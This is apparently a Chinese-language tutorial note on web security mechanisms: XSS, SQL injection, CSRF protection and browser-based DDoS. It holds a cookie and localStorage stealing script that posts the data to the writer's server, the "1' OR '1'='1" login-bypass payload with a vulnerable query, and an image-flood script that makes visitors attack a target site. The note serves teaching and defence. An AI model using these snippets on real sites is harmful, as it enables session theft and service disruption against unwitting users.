#Web安全機制

## #XSS(Cross-site Scripting)

1.假設網站有一個留言板

![](/assets/螢幕快照 2017-02-02 下午2.02.41.png)

2.但該網站沒有過濾script標籤，而是直接使用innerHTML讓使用者輸入後直接顯示

3.這時假設剛才的test.js 改為 你的網域下的一隻js程式碼，然後該程式碼內含有

```
var test1 = document.cookie;
function allStorage() {
    var values = [],
        keys = Object.keys(localStorage),
        i = keys.length;

    while ( i-- ) {
        values.push( localStorage.getItem(keys[i]) );
    }

    return values;
}
var test2 = allStorage(); //取得所有localstorage傳給變數test2

最後把test1與test2用ajax傳給你自己的server，即可獲得每個瀏覽他網站的使用者cookie與localstorage

```

最後把test1與test2用ajax傳給你自己的server，即可獲得每個瀏覽他網站的使用者cookie與localstorage

Ex:
```
$.post('https://我的站點/test',{cookie: test1,localStorage: test2})
```


## #SQL Injection



```
var userName = req.body.username;
var passWord = req.body.password;

strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

POST時將資料寫入

```
userName = "1' OR '1'='1";
與
passWord = "1' OR '1'='1";

```
將導致原本的SQL字串被填為

```
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

上述語句等同於

```
strSQL = "SELECT * FROM users;"
```

將會取出所有使用者

https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A

## #CSRF(Cross-site request forgery) 

偽造用戶請求像網站發出惡意請求

防範方式:

server 在render畫面時會給出 csrfhash，並隱藏在表單中，之後client端提交，此csrf會跟著送到server並且進行比對

```
<form method="POST" action="/upload?_csrf={{ csrfhash }}" enctype="multipart/form-data">
  title: <input name="title" />
  file: <input name="file" type="file" />
  <button type="submit">上传</button>
</form>
```

## #DDos(distributed denial-of-service attack)

中文為:分散式阻斷服務攻擊

假設我們寫如下程式
```
function imgflood() {  
  var TARGET = 'test.website.com'
  var URI = '/picture?'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}
setInterval(imgflood, 10)
```
之後瀏覽此網頁的使用者將會每0.01秒產生一個request到目標網站

所以不知情的使用者如果點選了我們的網站，他也會加入對目標網站攻擊的行列



